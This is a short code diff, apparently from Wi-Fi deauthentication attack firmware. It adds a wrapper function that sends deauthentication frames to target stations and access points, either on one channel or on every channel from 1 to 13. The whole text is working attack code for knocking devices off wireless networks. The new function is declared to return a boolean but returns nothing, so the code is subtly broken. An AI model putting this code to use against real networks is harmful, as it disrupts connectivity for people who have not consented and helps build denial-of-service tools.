@@ -311,19 +311,33 @@ void Attack::beaconUpdate() {
 }
 
 bool Attack::deauthStation(int num) {
-    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings.getDeauthReason(), stations.getCh(num));
+    return deauthDevices(stations.getAPMac(num), stations.getMac(num), settings.getDeauthReason(), stations.getCh(num));
 }
 
 bool Attack::deauthAP(int num) {
-    return deauthDevice(accesspoints.getMac(num), broadcast, settings.getDeauthReason(), accesspoints.getCh(num));
+    return deauthDevices(accesspoints.getMac(num), broadcast, settings.getDeauthReason(), accesspoints.getCh(num));
 }
 
 bool Attack::deauthName(int num) {
     if (names.isStation(num)) {
-        return deauthDevice(names.getBssid(num), names.getMac(num), settings.getDeauthReason(), names.getCh(num));
+        return deauthDevices(names.getBssid(num), names.getMac(num), settings.getDeauthReason(), names.getCh(num));
     } else {
-        return deauthDevice(names.getMac(num), broadcast, settings.getDeauthReason(), names.getCh(num));
+        return deauthDevices(names.getMac(num), broadcast, settings.getDeauthReason(), names.getCh(num));
     }
+}
+
+bool Attack::deauthDevices(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch)
+{
+	if (settings.getIsAllChannel())
+	{
+		for (uint8_t nch = 1; nch <= 13; ++nch)
+		{
+			deauthDevice(apMac, stMac, reason, nch);
+		}
+	}
+	else {
+		deauthDevice(apMac, stMac, reason, ch);
+	}
 }
 
 bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
